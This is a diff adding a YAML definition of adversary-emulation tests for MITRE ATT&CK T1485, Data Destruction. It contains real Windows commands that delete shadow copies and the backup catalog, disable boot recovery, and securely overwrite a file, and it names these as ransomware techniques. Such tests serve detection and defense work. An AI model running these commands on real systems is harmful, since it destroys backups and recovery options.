@@ -1,0 +1,61 @@
+---
+attack_technique: T1485
+display_name: Data Destruction
+
+atomic_tests:
+- name: Windows - Delete Volume Shadow Copies
+  description: |
+    Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    command: |
+      vssadmin.exe delete shadows /all /quiet
+
+- name: Windows - Delete Windows Backup Catalog
+  description: |
+    Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    command: |
+      wbadmin.exe delete catalog -quiet
+
+- name: Windows - Disable Windows Recovery Console Repair
+  description: |
+    Disables repair by the Windows Recovery Console on boot. 
+    This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    command: |
+      bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+      bcdedit.exe /set {default} recoveryenabled no
+
+- name: Windows - Overwrite file with Sysinternals SDelete
+  description: |
+    Overwrites and deletes a file using Sysinternals SDelete.
+    Requires the download of either Sysinternals Suite or the individual SDelete utility.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    file_to_overwrite:
+      description: Path of file to overwrite and remove
+      type: Path
+      default: C:\some\file.txt
+
+  executor:
+    name: command_prompt
+    command: |
+      sdelete.exe #{file_to_overwrite}
